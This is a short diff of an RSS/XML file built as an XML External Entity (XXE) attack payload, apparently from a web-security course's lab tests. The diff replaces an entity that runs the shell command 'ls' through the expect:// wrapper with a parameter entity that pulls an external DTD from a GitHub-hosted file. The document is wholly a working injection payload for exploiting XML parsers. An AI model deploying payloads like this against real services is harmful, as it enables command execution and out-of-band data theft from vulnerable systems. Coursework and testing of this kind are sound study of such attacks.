@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "expect://ls"
+<!ENTITY % xxe SYSTEM 'https://raw.githubusercontent.com/dsvid/COMP6843_xxe_tests/master/v2_external.txt'
  >]>
  <rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
